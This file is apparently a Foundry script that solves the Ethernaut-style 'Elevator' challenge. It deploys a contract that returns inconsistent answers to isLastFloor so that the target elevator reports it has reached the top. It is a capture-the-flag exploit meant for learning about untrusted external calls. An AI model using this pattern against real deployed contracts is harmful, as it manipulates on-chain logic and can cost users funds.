// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Script, console2} from "forge-std/Script.sol";

interface IElevator {
    function goTo(uint256 _floor) external;
	function top() external view returns (bool);
	function floor() external view returns (uint256);
}

contract MalliciousBuilding {
	bool entered = false; 
    function isLastFloor(uint256) external returns (bool) {
		if (entered) {
			return true;
		} else {
			entered = true;
			return false;
		}
	}

	function attack(address _target) external {
		IElevator(_target).goTo(1);
	}
}

contract Exploit is Script {
	function run() public {
//		address target = vm.envAddress("INSTANCE");
		address target = 0x8683380E7AbB44Cee2a1505a269349B9130B3cBb;
		IElevator elevator = IElevator(target);

		vm.startBroadcast();
		// deploy
		console2.log("current floor", elevator.floor());
		MalliciousBuilding attacker = new MalliciousBuilding();
		//attack
		attacker.attack(target);
		// Are we on the last floor yet
		console2.log("current floor", elevator.floor());
		require(elevator.top(), "Exploit failed");
		console2.log("current floor");
		vm.stopBroadcast();
	}
}
